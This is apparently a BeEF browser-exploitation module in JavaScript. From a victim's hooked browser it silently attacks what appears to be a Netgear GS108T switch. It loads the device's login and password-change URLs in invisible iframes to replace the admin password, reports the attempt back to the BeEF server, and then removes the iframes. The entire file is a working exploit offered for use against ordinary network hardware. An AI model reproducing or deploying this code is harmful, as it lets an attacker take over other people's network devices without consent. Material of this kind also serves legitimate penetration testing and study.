//
//   Copyright 2012 Bart Leppens
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var base = '<%= @base %>';
  var oldpassword = '<%= @oldpassword %>';
  var newpassword = '<%= @newpassword %>';
 
  var gs_iframe = beef.dom.createInvisibleIframe();
  gs_login = function()  {
     var d = new Date;
     var rtime = (d.getTime() / 200);
     gs_iframe.setAttribute('src', base+'login.cgi?passwd='+oldpassword+'&rtime='+rtime);
  }

  var gs108t_iframe = beef.dom.createInvisibleIframe();
  gs_change_pwd = function() {
     gs108t_iframe.setAttribute('src', base+'password.cgi?inputBox_oldPassword='+oldpassword+'&inputBox_newPassword='+newpassword+'&inputBox_retypeNewPassword='+newpassword);
  }

  //login to create the cookie
  gs_login();

  //wait some miliseconds and attempt to change the password
  setTimeout("gs_change_pwd()", 500);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(gs108t_iframe);
    document.body.removeChild(gs_iframe);
  }
  setTimeout("cleanup()", 15000);
});

